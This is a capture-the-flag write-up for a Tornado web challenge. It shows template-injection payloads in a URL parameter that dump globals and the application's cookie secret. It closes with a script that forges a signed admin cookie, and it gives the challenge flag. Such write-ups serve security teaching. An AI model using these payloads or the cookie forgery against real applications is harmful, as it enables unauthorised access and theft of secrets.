---
layout: post
title: "The Usual Suspects"
author: "anishbadhri"
tags: ['Web']
---

You may think I walk with no 'name' because it can be changed whenever I want. I am a 'person' whose 'secret' can never be found. Can you find this 'person's 'secret'?

[http://chall.csivit.com:30279](http://chall.csivit.com:30279)

## Solution

The website consists of a `<select>` with chocolate, vanilla and butterscotch. On selecting one and submitting, a message is displayed. 

On inspecting the url, it is seen that the parameter icecream is used as, `icecream={{chocolate}}`. This makes it clear that script injection can be done. By inserting some random string like `{{strawberry}}`, we can see that an error is thrown, but it is visible that the parameter is inserted into a `py` file. Thus, python scripts can be inserted as a parameter.

The python function `globals()` can be used to view all files. Inserting `{{globals().keys()}}`, a list of variables used in the code is obtained.
```python
dict_keys(['escape', 'xhtml_escape', 'url_escape', 'json_encode', 'squeeze', 'linkify', 'datetime', '_tt_utf8', '_tt_string_types', '__name__', '__loader__', 'chocolate', 'vanilla', 'butterscotch', 'application', 'secret', '__builtins__', '_tt_execute'])
```

The next step would be to find out which variable to use in this. On entering the webpage, a cookie called `admin` is set to `false`. This cookie is a Tornado cookie. To create a new token with `admin` as `true`, a secret key would be needed. This secret key is in the Tornado application object.

There is an `application` object as seen in the result of globals(). To find the members of this object, `dir(application)` can be sent as a parameter to the page.
```python
['__call__', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_load_ui_methods', '_load_ui_modules', 'add_handlers', 'add_transform', 'default_host', 'default_router', 'find_handler', 'get_handler_delegate', 'listen', 'log_request', 'on_close', 'reverse_url', 'settings', 'start_request', 'transforms', 'ui_methods', 'ui_modules', 'wildcard_router']
```
With the `settings` object, passing `application.settings` returns the cookie secret. `'cookie_secret': 'MangoDB\n'`. This can be used to create a signed token of `admin` as `true`. 


**Solution Script**:
```python
import tornado.ioloop
import tornado.web
import time

class User(tornado.web.RequestHandler):

    def get(self):
        cookieName = "admin"        
        self.set_secure_cookie(cookieName, 'true')

application = tornado.web.Application([
    (r"/", User),
], cookie_secret="MangoDB\n")

if __name__ == "__main__":
    application.listen(8888)
    tornado.ioloop.IOLoop.instance().start()
```

## Flag
```
csictf{h3r3_i_4m}
```